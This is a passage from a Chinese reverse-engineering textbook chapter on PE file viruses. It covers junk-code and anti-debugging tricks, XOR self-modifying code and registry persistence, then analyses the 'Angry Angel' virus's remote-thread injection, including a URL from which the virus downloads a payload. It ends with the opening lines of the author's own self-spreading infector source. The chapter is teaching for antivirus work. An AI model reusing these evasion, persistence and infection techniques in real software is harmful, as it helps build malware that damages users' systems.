[toc]

> UPS壳
>
> VM壳
>
> 动态变形壳

兵家言“知己知彼，百战不殆”，杀毒亦是如此。==要想更好地查杀PE病毒，我们有必要了解PE病毒的实现方法==。==在开始学习本章的内容之前，有一点要敬告大家：本章的内容是为了让大家能更好地查杀PE病毒，切勿使用该技术实施破坏或做违法的事情，否则后果自负。==

==本章讨论的这种PE病毒也是一个补丁程序，当它的宿主程序运行后就开始实施传播和模拟破坏行为==。

目前，常见的杀毒软件对PE病毒的处理方法都很简单，大部分不能还原文件，而是直接删除，用户别无选择，只能是重新安装受感染的程序。

PE病毒比直接在内存中感染，或通过加载启动项加载的病毒还要难以清除。原因是其感染范围大，无论是系统盘还是非系统盘，无论是硬盘还是U盘，都有可能存在被感染的文件，杀之不竭，防不胜防。有些用户即使重新安装了操作系统，也常常会因为不小心点击了带病毒的PE文件而重新感染。本章主要研究PE病毒所使用的基本技术特征，以及解毒方法。

敬告　讨论这部分的主要目的是为了学习，请勿使用该技术实施破坏或做违法的事情。

# 23.1　病毒保护技术

==PE病毒和计算机中的其他病毒一样，具备三大基本特性，即`破坏性`、`可传播性`和`隐蔽性`==。==PE病毒中使用的技术比较复杂，往往会让自动查杀工具陷入病毒设计的代码陷阱中，导致杀毒软件工作不正常或完全失效==。

本节以“愤怒天使”病毒为例，从编程角度来了解一下病毒普遍使用的保护技术。

> 扩展阅读　愤怒天使病毒
>
> 病毒名称：Win32.Angel.xx（xx根据实际情况会有不同，记录愤怒天使病毒的版本信息）
>
> 别名：愤怒天使
>
> 威胁级别：★☆☆☆☆
>
> 病毒类型：感染型
>
> 长度：16074
>
> 影响系统:Win9x\WinMe\WinNT\Win2000\WinXP\Win2003
>
> 该病毒会感染计算机系统中的可执行文件，并且试图让受感染的计算机系统主动链接下载网络中指定服务器上的病毒、木马等恶意程序。
>
> 病毒运行后，将病毒文件ServerX.exe复制到受感染计算机系统的系统目录下，并将其属性设置成“系统隐藏”，导致计算机用户无法发现并删除。病毒还会修改受感染系统的注册表启动项，以便随系统启动而自动运行。同时，病毒会不断地监控注册表有关键值项，如发现自身添加的启动项被删除，就会立即将其恢复。
>
> 病毒会搜索系统中所有磁盘分区中的可执行文件，将其感染。受到感染的可执行文件大小会变大，占用磁盘空间会增大，并且无法正常使用。另外，在病毒感染可执行文件的这个过程中，病毒会给每个受感染的文件做标记，以避免文件被重复感染。

==病毒为了能寄生到其他可执行程序中，使用了动态加载技术、静态补丁技术、重定位技术等==，这些技术在前面已经接触到了。下面主要来了解病毒为了对付杀毒软件的查杀以及动态调试软件的跟踪调试等使用的一些自我保护的手段和技术。

# 23.1.1　花指令

==花指令（Junk Code），顾名思义，即花哨的指令、没有用的指令==。通过在代码中添加花指令，可以增加反汇编和逆向的难度，让破解者无法正确地反汇编程序的功能，使破解者在调试和跟踪过程中迷路。==花指令的构造五花八门，主要方法可以通过一些跳转指令、栈或位运算来实现，以下以跳转指令为例来看花指令的编写方法==，看下面的代码：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.do1hlh4nsvk.jpg)

以上反汇编代码选自愤怒天使病毒，看其中的两句：

------

```assembly
js 00000006
jns 00000006
```

------

==这两条指令等价于直接跳转。因为两个判断都指向同一个地址，指令起始字节码为E8==。==将E8前的垃圾指令EB（如上所示，已经为该指令设置了删除线）更改为90，然后重新加载再来反汇编==（以下反汇编代码取自被感染了愤怒天使病毒的记事本程序的相同位置）：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.72box19wbdw0.jpg)

可以看到，反汇编代码已经发生了重组，90 E8指令被分解，前一个解释为nop指令，后一个则和其后的一个双字组合成另外的指令。即代码中的条件判断语句转移到的地址0100F516处变成了一个call调用指令，继续看call指令后的操作数所在位置的反汇编指令字节码：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.27jclk4qetz4.jpg)

==跳转到的位置仅仅是一个返回指令RETN，并没有做任何有意义的操作，所以说，call notepadr.010109CA也是一条花指令==。下面用汇编源代码完整地还原该部分花指令的构造方法：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.3t5hsi6slt00.jpg)

定义的函数Rubbish没有做任何操作，是花指令；条件分支语句跳转到同一个位置，也是花指令；添加的无用字节码EB会被调试软件解释成指令语句，扰乱正常的调试过程。以上指令中，有用的指令只有最后一句（也就是加黑部分）。通过添加无用字节码EB，可以有效地阻碍调试器的正常调试，使程序流程转向错误的业务逻辑。

## 23.1.2　反跟踪技术

==通过在指令中添加无用的数据，可以造成调试器的误识，从而防止反病毒人员对病毒代码进行跟踪调试==。==在上面的例子中，数据EB即为垃圾指令，在代码段中插入这样的数据，很容易让调试器误识==。看下面的例子：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.4hs9eb10c9a0.jpg)

==地址0x0100F51F处的指令为一个调用指令`CALL notepadr.0100F535`，可是大家却发现调试器真正反汇编出的代码中，该地址的字节码并不是指令，而是操作数，最大的元凶就是59前的垃圾数据EB==。==这主要是因为大部分的调试器多采用线性扫描算法，对代码中夹杂的垃圾数据并不进行全局范围的深入分析，这样就无法正确识别代码与数据，从而造成误识==。将该字节EB更改为90后，59就由操作数变成了指令。以下是再次反汇编的结果：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.3gt0zwgsxya0.jpg)

还有比这更复杂一点的例子，看以下反汇编指令：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.6m97s3v8iy80.jpg)

相应的字节码为：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.5uozsoy8u2w0.jpg)

可以看到，5E指令前的所谓垃圾指令00还不能被替换为其他值，因为它不仅是垃圾指令，还另有他用，它是函数名GetProcAddress的最后一个“\0”结尾字符。如果将该字节修改成90，则会影响程序运行，导致运行失败。从上面的分析可以看出，巧妙地利用一些编程技巧可以有效地减缓跟踪代码流程的进度，为逆向分析制造麻烦。假设病毒程序的设计者在病毒代码中加入对某段代码的运行时间的检测，通过判断运行时间值即可发现当前进程是否处于用户调试跟踪状态，从而采取更有效的措施结束调试或误导用户进入其他代码流程，这属于反调试的范畴。

## 23.1.3　反调试技术

==反病毒工作的第一步是动态调试病毒程序流程，而病毒要做的则是反调试技术==。==病毒通过各种方法获取当前运行的进程状态，看病毒进程是否处于被调试状态，如果处在被调试状态，则执行破坏模块或者执行反调试程序==。

以下是一个获取当前进程是否处于被调试状态的示例。该示例采用的主要方法是在操作系统记录的与当前线程或进程中查找与调试有关的信息。==通过对本书9.1.4节的学习我们知道，操作系统中的每一个程序在运行时会维护一个主线程对应的TEB，即线程环境块，而该块中30h处指向了该线程所属的进程环境块PEB。在PEB偏移68h处有一个标志字`NtGlobalFlags`，这个标志字随着进程状态的不同而不同==。以下是该标志字常用的值及常量符号定义：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.5ijiocq5i3s0.jpg)

==进程如果被调试程序创建，那么在加载映像期间，用户模式的代码在调用`LdrpInitialize`函数进行初始化时，会通过`PEB.BeingDebugged`字段的值来判断当前进程是否处在被调试阶段，如果被调试，则系统会将`NtGlobalFlag`的值设置为以下内容==：

------

```c
If(!NT_SUCCESS(st)){
	If(Peb-＞BeingDebugged){
		Peb-＞NtGlobalFlag|=FLG_HEAP_ENABLE_TAIL_CHECK|
		FLG_HEAP_ENABLE_FREE_CHECK|
		FLG_HEAP_VALIDATE_PARAMETERS ;
		......
```

------

==从以上所列代码可以看出，`NtGlobalFlag`的值被设置为当前值与三个标志相或的组合，最终`NtGlobalFlag`得到的结果是70h。通过该标志字就可以判断当前进程是否处在被调试状态，其实这种方法和直接通过字段`Peb.BeingDebugged`的值进行判断的效果是一样的==。代码清单23-1的程序代码实现了上述方法。

代码清单23-1　反调试技术实例（chapter23\antidebug.asm）

------

```assembly
;------------------------
; 反调试技术测试
; 戚利
; 2006.2.28
;------------------------
    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc
include    user32.inc
includelib user32.lib
include    kernel32.inc
includelib kernel32.lib

;数据段
     .data  
szText        db  "HelloWorldPE", 0  
szDebugged    db  "我正在被调试!", 0  
szNoDebugged  db  "没有被调试!", 0  

     .code
start:
  assume fs:nothing
  ;指向 PDB(Process Database)  
  mov eax,fs:[30h]  ;EAX为TEB.ProcessEnvironmentBlock

  mov eax, [eax+68h]
  and eax, 070h     ;NtGlobalFlags
  test eax, eax
  jne @isDebugged

  invoke MessageBox,NULL,addr szNoDebugged,\
                                      NULL,MB_OK
  jmp @ret

@isDebugged:
  invoke MessageBox,NULL,addr szDebugged,\
                                      NULL,MB_OK
@ret:
  invoke ExitProcess,NULL 

              end start 

```

------

==以上所述只是根据系统记录信息判断进程是否被调试的一种方法，我们还可以通过诸如API函数（如函数`IsDebuggerPresent`）来判断进程是否处于被调试状态==；==还有的病毒则通过获取所有常用调试器的特征来判断当前进程是否处于被调试状态等==。类似的技术也会随着人们对调试态与正常态下程序状态及相关信息存在的区别的了解的深入被越来越多地开发出来。

## 23.1.4　自修改技术

==`SMC（Self-Modifying Code，代码的自修改）`技术是指对要运行的代码预先进行加密，在运行时将代码在内存实施再解密还原的技术==。==通过这样的技术，可以实现简单的代码保护，不过这种技术加密的代码通过动态跟踪识别，很容易就能得到解密后的代码==。以下是一个简单的例子：

------

```assembly
......
mov eax,offset _encrptEnd
sub eax,offset _encrptStart
mov dwEncrptSize,eax
lea eax,_encrptStart
invoke _encrptIt,eax,dwEncrptSize
_encrptStart:
	db 1eh,74h,1eh,74h,1ch,74h,44h,34h
	db 74h,1eh,74h,9ch,73h,74h,74h,74h
_encrptEnd:
......
```

------

如上所示，==程序运行时，会首先将`_encrptStart`开始的加密字节码还原==。==程序使用了最简单的加密算法XOR（异或算法），由于对一个数异或两次得到的还是这个数本身，所以加密和解密都可以只用一个函数==。以下是该函数的详细定义：

------

```assembly
;----------------------
;异或加密解密算法
;加密解密使用同一个函数
;----------------------
_encrptIt proc _lpSrc,_size
	pushad
	mov esi,_lpSrc
	mov edi,_lpSrc
	mov ecx,_size
loc1:
	mov al,byte ptr [esi]
	xor al,74h ;算法很简单，异或
	mov byte ptr [edi],al
	inc esi
	inc edi
	dec ecx
	.if ecx!=0
		jmp loc1
	.endif
	popad
	ret
_encrptIt endp
```

------

==函数`_encrptIt`将得到的字节与74h异或，作为加密后的字节存储，被加密的字节重新与74h异或则能得到最初的字节（即解密后的字节）==。经过解密以后的字节码被还原以后变成指令代码，如下黑体部分所示：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.s6dy97b40z.jpg)

解密完成后，程序指令指针会指向该部分数据的起始，然后运行刚解密的代码。

> 注意　由于加密是在内存的代码中进行，所以需要注意一点的是，在链接时要指定代码段属性为可读、可写、可运行，相关代码在随书文件chapter23\smc1.asm中。

## 23.1.5　注册表项保护技术

有些病毒为了获得控制权，并不感染PE文件通过宿主的运行进入内存，而是感染系统启动项，这些启动项包括（但不限于）以下所列：

------

```
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEX
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
HKEY_LOCAL_MACHINE\System\ControlSet001\Session Manager
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\本地User\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

------

==病毒在注册表启动项中添加了引导自身启动的定义以后，为了防止被其他用户或者杀毒软件将其删除或修改，还必须时刻监视注册表的变化，随时修正这里的值，保证此处的值始终有效==。以下是愤怒天使病毒代码中，通过一个线程回调函数来执行注册表监控操作的反汇编代码：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.7cwugts88so0.jpg)

==以上代码通过函数`RegQueryValueExA`在注册表中查找`Serverx`键，获取键值==。函数原型如下：

------

```c
LSTATUS RegQueryValueExA
(
	HKEY hkey,
	LPCSTR name, ;指定要查询的子键名
	LPDWORD reserved,
	LPDWORD type, ;返回键的类型
	LPBYTE data, ;返回键的名称
	LPDWORD count
)
```

------

接着往下看：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.60tuiwou6p.jpg)

==通过调用函数`RegNotifyChangeKeyValue`跟踪注册表指定位置的值是否发生变化==。函数原型如下：

------

```c
LONG WINAPI RegNotifyChangeKeyValue(
	HKEY hKey,
	BOOL bWatchSubtree, ;要监视的子键
	DWORD dwNotifyFilter, ;监视过滤器
	HANDLE hEvent, ;事件
	BOOL fAsynchronous
);
```

------

函数中各参数解释如下：

1. `hKey`：要监视的键的句柄，或者指定一个标准键名。
2. `bWatchSubtree`：TRUE（非0）表示监视子项以及指定的项。
3. `dwNotifyFilter`：下述常数的一个或多个：
   1. `REG_NOTIFY_CHANGE_NAME`，侦测注册表项名称的变化，以及侦测注册表的创建和删除事件。
   2. `REG_NOTIFY_CHANGE_ATTRIBUTES`，侦测属性的变化。
   3. `REG_NOTIFY_CHANGE_LAST_SET`，侦测上一次修改时间的变化，该例中使用了这个常数。
   4. `REG_NOTIFY_CHANGE_SECURITY`，侦测对安全特性的改动。
4. `hEvent`：一个事件的句柄。如fAsynchronus为FALSE，则这里的设置会被忽略。
5. `fAsynchronus`：如果为0，那么除非侦测到一个变化，否则函数不会返回。如果为其他值，则这个函数会立即返回，而且在发生变化时触发由`hEvent`参数指定的一个事件。该函数的调用示例如下：

------

```c
RegNotifyChangeKeyValue(
	hreg,
	TRUE,
	REG_NOTIFY_CHANGE_LAST_SET,
	mWatchReg,
	TRUE
) ;
```

------

接着往下看，以下代码是重设注册表项的值：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.3yzm6uuwq360.jpg)

==如果发现注册表项被修改，则执行`RegSetValueExA`函数重设病毒代码预设的值==。==通过构造这样的一个死循环，然后将这个循环放入一个线程回调函数中，就实现了对注册表项的监视和修复操作==。

## 23.1.6　进程保护技术

==病毒程序要想在内存中长久地运行，必须有自己的生存之道，这涉及进程的保护技术==。==RING3下常见的进程保护大部分都是通过注册系统服务或远程线程注入==（这项技术在13.1.4节讲过），==或者通过HOOK一些API函数进行自我隐藏和保护==。==PE病毒的运行一般都依赖于宿主程序，它寄生到宿主程序中的意图很明显：不想让我活，你也别想活==！以下节选自对愤怒天使病毒的分析，其基本思路为：

1. **步骤1**　随意找一个窗口。
2. **步骤2**　找到窗口的进程ID。
3. **步骤3**　使用`PROCESS_VM_OPERATION`|`PROCESS_VM_WRITE`|`PROCESS_VM_READ`标志打开该进程，得到该进程的`HANDLE`。
4. **步骤4**　使用`VirtualAllocEx`在该进程上分配适当大小的内存，得到一个地址。这个地址是远程进程的，通过`mov`指令直接修改该地址上的值是无效的。
5. **步骤5**　如果需要传递一些参数到远程进程，可以通过函数`WriteProcessMemory`在该内存上写一些内容。
6. **步骤6**　使用`CreateRemoteThread`在远程进程中创建线程，执行非法操作。从表面上看，这意味着“让好人做坏事”。
7. **步骤7**　关闭句柄。
8. **步骤8**　调用`VritualFreeEx`将上面的内存释放。

以下是病毒通过远程线程注入保护自己的代码分析部分：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.6mjjz37t12c0.jpg)

返回了病毒程序的完整路径：

edi="C:\windows\system32\Serverx.exe"

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.3lhawa38y6y0.jpg)

注意，上面的函数地址并未获取到，在病毒里对此情况已经有所考虑。

在Windows9x/2000中，每个应用程序都可以通过函数`RegisterServiceProcess`向系统申请注册成为一个服务进程，同时，通过这个函数注销其服务进程来结束这个服务进程的运行。如果一个进程注册为一个服务进程，通过Ctrl+Alt+Del就可以在任务列表里看见该进程的标题；而如果一个进程运行但没有向系统申请注册成为服务进程，那么就不会在任务列表里显示。愤怒天使病毒正是利用这个原理，使自身在运行时能在任务列表中实现隐藏。该函数存放于系统内核kernel32.dll中，具体声明如下：

------

```c
DWORD RegisterServiceProcess(
	DWORD dwProcessId,
	DWORD dwType
);
```

------

==其第一个参数指定为一个服务进程的进程标识，如果是0则注册当前的进程==；==第二个参数指出是注册还是注销当前的进程，其状态分别为`RSP_SIMPLE_SERVICE`和`RSP_UNREGISTER_SERVICE`==。遗憾的是，该函数只存在于Windows 9x系统的kernel32.dll中，在NT中并不存在该函数。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.73xe444aj1k0.jpg)

查找窗口句柄函数`FindWindowA`，其原型为：

------

```c
HWND WINAPI FindWindow(
	__in _opt LPCTSTR lpClassName,
	__in _opt LPCTSTR lpWindowName
);
```

------

两个参数分别是窗口的类名和窗口标题名。如果全部为NULL，则匹配任何一个窗口。

eax的返回值0001008C指向的位置数据为Unicode字符：

------

"\Documents and Settings\Administrator\ApplicationData".

------

接着往下看：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.1yafyck9ndfk.jpg)

以上函数调用了`GetWindowThreadProcessId`，获取指定窗口所属的进程ID。原型为：

------

```c
DWORD GetWindowThreadProcessId(
	HWND hWnd,//窗口句柄
	LPDWORD lpdwProcessId//返回进程ID
)
```

------

函数的功能：读取一个窗口的进程和线程ID，返回值是线程ID。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.5k76rmavopg0.jpg)

程序通过OpenProcess以不同的权限和用途打开一个已经存在的进程对象，函数原型：

------

```c
HANDLE WINAPI OpenProcess(
	__in DWORD dwDesiredAccess,
	__in BOOL bInheritHandle,
	__in DWORD dwProcessId
);
```

------

其中，`dwDesiredAccess`设置为`PROCESS_ALL_ACCESS`，即十六进制的1F0FFFh。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.2lqdm2znaku0.jpg)

程序通过调用`VirtualAllocEx`在目标进程的内存中获取空间。函数原型为：

------

```c
LPVOID VirtualAllocEx(
	HANDLE hProcess,//申请内存所在的进程句柄
	LPVOID lpAddress,//保留页面的内存地址；一般用NULL自动分配
	SIZE_T dwSize,//欲分配的内存大小，字节单位；注意实际分配的内存大小是页内存大小的整数倍
	DWORD flAllocationType,
	DWORD flProtect
);
```

------

==在目标进程获取内存空间的主要目的是，想与目标进程进行数据结构的共享==。==当病毒有一些数据结构需要在目标进程操作时，必须将信息存放到目标进程的地址空间中==。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.6hxg247g04w0.jpg)

==通过函数`WriteProcessMemory`将数据写入目标进程地址空间==。函数原型如下：

------

```c
BOOL WINAPI WriteProcessMemory(
	__in HANDLE hProcess,
	__in LPVOID lpBaseAddress,
	__in LPCVOID lpBuffer,
	__in SIZE_T nSize,
	__out SIZE_T*lpNumberOfBytesWritten
);
```

------

各参数解释如下：

1. `hProcess`：进程句柄。
2. `lpBaseAddress`：指向进程内存的基地址。
3. `lpBuffer`：缓冲区的指针，保存写入内容。
4. `nSize`：写入指定进程内存的字节数。
5. `lpNumberOfBytesWritten`：返回实际写入的字节数量。

==病毒往目标进程空间写入的数据如下==：

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.5zstrcjz0080.jpg)

从以上所示数据的ASCⅡ码提示可以看出，这段代码是从非法网站http://vguarder.91i.net/SETUPX.EXE中下载与病毒运行有关的动态链接库文件。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.6s2cqd67ae00.jpg)

以上代码获得当前进程的ID号。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.42fvlutmsvs0.jpg)

==如以上代码所示，程序通过函数`CreateRemoteThread`将复制到其他进程的代码激活，也就是说，`CreateRemoteThread`可将线程创建在远程进程中==。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.5tsp4trf9cs0.jpg)

==以上代码调用`CloseHandle`关闭打开的句柄==。

![image](https://github.com/YangLuchao/img_host/raw/master/20231031/image.2kqxiptku1g0.jpg)

==调用函数`CloseHandle`关闭使用`OpenProcess`打开的进程句柄==。==至此，病毒程序实现了在目标进程运行病毒代码的目的==。==用户要结束病毒代码，就需要通过复杂的技术，或者直接终止目标进程，通过这样的手段，为病毒代码的清理工作制造很大的麻烦，从而达到保护病毒代码不被轻易终止的目的==。

以上介绍了几种常见的病毒保护自己的方式，以及避免被跟踪被调试的技术，下面来看病毒补丁程序的编写。

# 23.2　PE病毒补丁程序解析

==本节的重点是分析PE病毒的补丁程序==。==在第一次运行时，将使用第17章介绍的补丁工具bind.asm实施附加病毒代码==；==当补丁程序被附加进目标PE文件后，再运行目标PE文件，由打了补丁的目标PE文件负责病毒的传播==。

> 重要提示　以下将要叙述的这个程序已经具备了基本的传播特性，所以大家在测试时一定不能在系统目录或其他软件目录下运行。请在磁盘上新建一个目录，然后复制一些系统可执行程序进行测试，完成测试后删除即可。本程序在Windows XP SP3下测试通过。
>

## 23.2.1　病毒特征

首先来看PE病毒程序应具备的三个基本属性。

==传统意义上的计算机病毒一般具有以下三个基本特征：`破坏性`、`传播性`、`隐蔽性`==。这三个基本特征会在分析病毒程序的编写时逐一实现。

### 1.隐蔽性

==本实例的病毒补丁程序寄生在正常的可执行文件中，在实施模拟破坏时（在磁盘上创建一个新目录）用户根本觉察不到==。==补丁程序在实施传播时，通过向进程所在当前目录中的PE文件打补丁的方式，实现病毒代码的传播，用户察觉不到==。==所以对用户来说，补丁程序的运行是透明的，具备隐蔽特性==。

### 2.传播性

==本实例的病毒补丁程序通过搜索目标PE目录下的所有可执行文件，对这些可执行文件进行补丁以实现传播==。==与前几章介绍的补丁工具bind.exe不同，本实例打补丁的代码已经附加进了PE文件里，不需要用户的参与，这意味着补丁程序本身具备补丁工具的功能==。出于教学的目的，我们只是在目标PE文件所在的当前路径里进行传播；==在现实生活中，大部分的病毒程序是不会放过`Windows`系统目录和`System32`目录的==。==真实的病毒甚至还会通过网络端口、电子邮件等更广的途径实现对病毒代码的传播==。

### 3.破坏性

==本实例演示的病毒补丁程序只是象征性地在C盘根目录下建立了BBBN子文件夹，这只是模拟破坏模块==。==真实的病毒模块中的破坏代码千奇百怪：有的会显示一些提示信息，扰乱正常的屏幕显示；有的会尝试关闭一些启动的进程；有的会删除硬盘上的文件；有的甚至还尝试做格式化硬盘的操作等==。

==需要注意，与以前的跳转代码不同的是，本实例补丁程序中使用了另外一种原始入口跳转方法==：

------

```assembly
mov eax,12345678h
org $-4
OldEIP dd 00001000h
add eax,12345678h
org $-4
ModBase dd 00400000h
jmp eax
```

------

==以上代码使用了一个汇编语言的小技巧，通过伪指令`org $-4`实现指令重叠。以上语句等价于==：

------

```assembly
mov eax,OldEIP
add eax,ModBase
jmp eax
```

------

这种指令跳转的方式在本书22.2.3节中也有过介绍。

## 23.2.2　补丁程序的源代码分析

本PE病毒补丁程序完整的源代码见代码清单23-2，共1164行。考虑到篇幅和学习方便，此处省略了一些常规的调用函数。

代码清单23-2　PE病毒补丁程序（chapter23\patch.asm）

------

```assembly
1 ;-------------------------
2 ;PE病毒补丁程序
3 ;本段代码使用了将代码添加到最后一节的方法
4 ;程序功能：实现创建目录的方法，具备传播功能
5 ;作者：戚利
6 ;开发日期：2010.7.7
7 ;-------------------------
8
9 .386
10 .model flat,stdcall
11 option casemap:none
12
13 include windows.inc
14
15
16 VIR_TOTAL_SIZE equ offset vir _end-offset vir _start
17 INFECTFILES equ 03h ;感染文件的个数
18 DEFAULT_KERNEL_BASE equ 07C800000h ;kernel32的默认基地址
19 DEFAULT_KERNEL_BASEwNT equ 077F00000h
20
21
```

------

==常量`VIR_TOTAL_SIZE`是病毒代码的总长度，包含数据和代码的长度==；==在对正常EXE文件打补丁的时候，该长度为EXE文件增加的长度==。==其计算方法为以下两个标号地址的差：`vir_end`和`vir_start`==。

==常量`INFECTFILES`是每次运行病毒时感染的文件个数==。==因为补丁程序不可能让病毒一次运行就把当前目录下所有的文件全部感染，在一个有上百或上千个EXE文件的目录中，这样做很容易被发现==。==每次感染文件个数一旦超过这个值，病毒代码则选择静默，不感染任何EXE文件，直到下一次运行才被激活==。

==常量`DEFAULT_KERNEL_BASE`记录了在Windows XP SP3中`kernel32.dll`被装入的基地址，不过这个值在整个程序编写过程中会自动获取，并且通常获取到的结果即是正确的结果==。==所以，你可以把这个值看成是一个摆设==。==同理，常数`DEFAULT_KERNEL_BASEwNT`则记录了NT下的`kernel32.dll`的基地址==。

------

```assembly
22 _ProtoGetProcAddress typedef proto :dword,:dword
23 _ProtoLoadLibrary typedef proto :dword
24 _ProtoCreateDir typedef proto :dword,:dword
```

------

==以上三行是补丁代码里用到的主要API函数的声明==。本书第11章讲过，==为了方便代码嵌入，必须在代码中将导入表去掉，由补丁程序自己加载它所需要调用的函数==。==在这里，补丁程序用最简单的`CreateDirectoryA`函数代替所有的病毒破坏代码==。

==真正的病毒用到的函数可能成百上千，所以，出现在这里的声明会比现在看到的更长一些==。

------

```assembly
25
26
27 _ApiGetProcAddress typedef ptr _ProtoGetProcAddress
28 _ApiLoadLibrary typedef ptr _ProtoLoadLibrary
29 _ApiCreateDir typedef ptr _ProtoCreateDir
30
```

------

==以上三行是函数类型声明。这个声明是为了方便在数据部分定义函数变量==。

------

```assembly
31 .code
32 ;被添加到目标文件的代码从这里开始，到vir _end处结束
33 vir _start equ this byte
34
35 jmp _NewEntry
36
37
```

------

==行31是标识整个补丁程序的代码段==。==行33定义了标号`vir_start`的值，行35通过一个简单的跳转指令直接跳过在代码段中定义的数据==。很明显这种结构符合本书13.3.1节介绍的嵌入补丁框架的结构。

### 1.变量定义

==从38行开始，定义该补丁程序中用到的所有变量的声明和初始化==。==这些变量包括基于`全局的函数名列表`、`函数地址列表`、`PE病毒程序版本标识`、`感染文件数量上限`、`补丁工具用到的参数`等==。

------

```assembly
38 szGetProcAddr db 'GetProcAddress',0
39 szLoadLib db 'LoadLibraryA',0
40 szCreateDir db 'CreateDirectoryA',0 ;该方法在kernel32.dll中
41 szDir db 'C:\\BBBN',0 ;要创建的目录
42
43
```

------

==因为补丁程序中用到的三个函数都在`kernel32.dll`中，而`kernel32.dll`在每个运行的EXE程序中都被默认装载，所以，这里定义的函数声明其实并不完整==。==真正可能的定义会像下面这样，每个函数所在的动态链接库必须被声明，并事先加载到虚拟内存空间中==。

如果以下这些内容被翻译成字节码，大家是不是感觉很熟悉，回顾PE文件导入表字段`IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk`指向的那一部分，是不是很类似？

------

```assembly
szTranslateAcceleratorA db 'TranslateAcceleratorA',0
szTranslateMessage db 'TranslateMessage',0
szUpdateWindow db 'UpdateWindow',0
szUser32 db 'user32.dll',0,0
szExitProcess db 'ExitProcess',0
szGetModuleHandleA db 'GetModuleHandleA',0
szRtlZeroMemory db 'RtlZeroMemory',0
szlstrcmpA db 'lstrcmpA',0
szKernel32 db 'kernel32.dll',0,0
```

------

接着看代码：

------

```assembly
44 mark _db '[VirPE.Qili.v1.00]',0 ;病毒标识
45 db '(c)2010 Qili ShanDong',0
46 EXE_MASK db '*.exe',0
47 infections dd 00000000h ;感染文件的个数，超过指定个数即退出
48 kernel dd DEFAULT_KERNEL_BASE
49
```

------

`mark_`是病毒编写者的个人喜好，有的`mark`是用文字来描述，有的则使用图标来展示。有的人可能是为了出名，就像在书籍里声明“版权所有，侵权必究”那样；而笔者认为它是一个版本标识，负责记录该PE病毒的版本信息。

==变量`infections`是已感染EXE文件个数的记录，每感染一次即和常量`INFECTFILES`进行比较，超出则静默，不再执行感染操作==。

==变量`kernel`是存放`kernel32.dll`基地址的变量，如果获取基地址失败，则被赋值为常量`DEFAULT_KERNEL_BASE`或`DEFAULT_KERNEL_BASEwNT`==。

------

```assembly
50 szFunNames equ this byte ;函数名列表
51 szFindFirstFileA db 'FindFirstFileA',0
52 szFindNextFileA db 'FindNextFileA',0
53 szFindClose db 'FindClose',0
54 szCreateFileA db 'CreateFileA',0
55 szSetFilePointer db 'SetFilePointer',0
56 szSetFileAttributesA db 'SetFileAttributesA',0
57 szCloseHandle db 'CloseHandle',0
58 szGetCurrentDirectoryA db 'GetCurrentDirectoryA',0
59 szSetCurrentDirectoryA db 'SetCurrentDirectoryA',0
60 szGetWindowsDirectoryA db 'GetWindowsDirectoryA',0
61 szGetSystemDirectoryA db 'GetSystemDirectoryA',0
62 szCreateFileMappingA db 'CreateFileMappingA',0
63 szMapViewOfFile db 'MapViewOfFile',0
64 szUnmapViewOfFile db 'UnmapViewOfFile',0
65 szSetEndOfFile db 'SetEndOfFile',0
66 db 0bbh ;结束符
67
```

------

==传播病毒时用到的函数名列表如上所示，它们是以一个`0bbh`字节（保证该字节和函数名中定义的任何一个字符都不相等）结尾，主要目的是通过设置一个标志字节，可以有效地利用循环，避免逐个函数处理，以提高编程效率==。==当碰到第一个字节为`0bbh`时，循环即结束==。==这种方法可以让代码变得更短==，同理，行109的函数地址也是如此定义。

------

```assembly
68 dd 12345678h
69 newSize 		dd 00000000h
70 searchHandle dd 00000000h
71 fileHandle 	dd 00000000h
72 mapHandle 	dd 00000000h
73 mapAddress 	dd 00000000h
74 addressTableVA 	dd 00000000h
75 nameTableVA 		dd 00000000h
76 ordinalTableVA 	dd 78563412h
77 dwPatchCodeSize 	dd ? ;补丁程序大小
78 dwNewFileSize 	dd ? ;新文件大小=目标文件大小+补丁程序大小
79 dwNewPatchCodeSize 	dd ? ;补丁程序按8位对齐后的大小
